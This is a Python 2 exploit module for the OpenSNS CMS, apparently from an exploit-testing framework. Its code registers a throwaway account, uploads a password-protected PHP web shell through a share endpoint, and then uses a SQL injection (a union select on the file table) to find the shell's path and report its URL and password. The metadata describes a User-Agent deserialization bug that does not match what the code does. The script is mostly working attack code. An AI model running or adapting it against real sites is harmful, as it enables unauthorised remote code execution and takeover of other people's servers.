#coding: utf-8

import os
import sys
import datetime
import urllib
from exp_template import Exploit, Level, session, get_random_password
import re, random, json

"""
构造函数需要传递以下参数:
url      要测试的目标
taskid   默认为0，当没有创建任务时使用
targetid 默认为0，当没有创建任务时使用

exp需要实现的方法为meta_info和exploit
cms 无法安装
modify by swm 20180817
"""
class opensns_parsestr_fileupload(Exploit):
    def meta_info(self):
        return {
            'name': 'opensns_parsestr_fileupload',
            'author': 'h',
            'date': '2018-02-28',
            'attack_type': 'GetShell',
            'app_type': 'CMS',              #路由器为Router
            'app_name': 'OpenSNS',
            'min_version': '',
            'max_version': '',
            'version_list': '',             #min_version,max_version 和 verion_list 二者必选其一
            'description': '前台访问时，将User-Agent序列化后存入数据库，再次访问时会反序列化，导致命令执行，可执行php代码',
            'reference':'finecms_parsestr_getshell.docx',   #参考文档
            'cve':'',
        } 
        
    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        for i in range(10):
            self.url = self.url.strip('/')
        req = session()
        try:
            rsp = req.get(url=self.url)
        except:
            self.report('连接目标失败', Level.error)
            return
        try:
            username = '%s@gmail.com' % get_random_password()
            reg_data = {
                'role': 1,
                'username': username,
                'reg_type': 'email',
                'nickname': username.split('@')[0],
                'password': get_random_password(),
            }
            rsp = req.post(url=self.url+'/index.php?s=/ucenter/member/register.html', data=reg_data)
        except:
            self.report('注册用户失败', Level.error)
            return
        try:
            upload_data = {
                'content': get_random_password(),
                'query': 'app=Home&model=File&method=upload&id=',
                'submit': 'Submit',
            }
            randpass = get_random_password()
            shell = {'Filedata':('%s.php'%get_random_password(), open("shell/shell01.php",'rb').read().replace('__RANDPASS__', randpass))}
            rsp = req.post(self.url+'/index.php?s=/weibo/share/doSendShare.html', data=upload_data, files=shell)
        except Exception as e:
            self.report('上传Shell失败', Level.error)
            return
        try:
            inject_url = '/index.php?s=/ucenter/index/information/uid/23333 union (select concat(\'%s@\',id),2,concat(savepath,savename),4 from ' % get_random_password()
            inject_url+= 'ocenter_file where ext in (\'php\') order by id desc limit 0,1)#.html'
            rsp = req.get(self.url+inject_url)
        except Exception as e:
            print e
            self.report('获取Shell地址失败', Level.error)
            return
        f = open('xxx.txt', 'wb')
        f.write(rsp.content)
        f.close()
        m = re.search(r'<attr title="(.*?)"', rsp.text, re.I|re.M)
        if m:
            #print self.url+'/Uploads/'+ m.group(1), randpass
            self.shell_info(self.url+'/Uploads/'+ m.group(1), randpass, 'php')
            return
        else:
            self.report('获取Shell地址失败', Level.error)
            return         
            
if __name__ == "__main__":
    if len(sys.argv) == 2:
        a = opensns_parsestr_fileupload(sys.argv[1])
        a.exploit()
    else:
        print '%s url' %  __file__
        print '%s http://192.168.1.11' %  __file__


